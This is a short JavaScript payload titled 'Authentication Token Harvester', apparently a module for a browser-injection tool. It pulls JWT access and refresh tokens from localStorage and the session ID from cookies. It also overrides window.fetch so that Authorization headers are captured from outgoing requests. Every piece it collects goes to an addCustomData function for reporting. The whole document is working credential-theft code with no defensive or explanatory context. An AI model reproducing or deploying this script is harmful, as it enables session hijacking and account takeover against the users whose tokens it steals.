// Name: Authentication Token Harvester
// Description: Extracts JWT tokens, session IDs, and authorization headers from localStorage, cookies, and network requests

(function() {
  const authData = {
    title: "Authentication Tokens",
    data: {
      // JWT from localStorage
      jwt: localStorage.getItem('access_token') || null,
      refreshToken: localStorage.getItem('refresh_token') || null,
      
      // Session from cookies
      sessionId: document.cookie.match(/sessionid=([^;]+)/)?.[1] || null,
      
      // Check authorization headers in fetch interceptor
      authHeader: null
    }
  };
  
  // Intercept fetch to capture auth headers
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    if (args[1] && args[1].headers) {
      const authHeader = args[1].headers['Authorization'] || 
                        args[1].headers['authorization'];
      if (authHeader && !authData.data.authHeader) {
        authData.data.authHeader = authHeader;
        addCustomData(authData);
      }
    }
    return originalFetch.apply(this, args);
  };
  
  // Send immediately if we have tokens
  if (authData.data.jwt || authData.data.sessionId) {
    addCustomData(authData);
  }
})();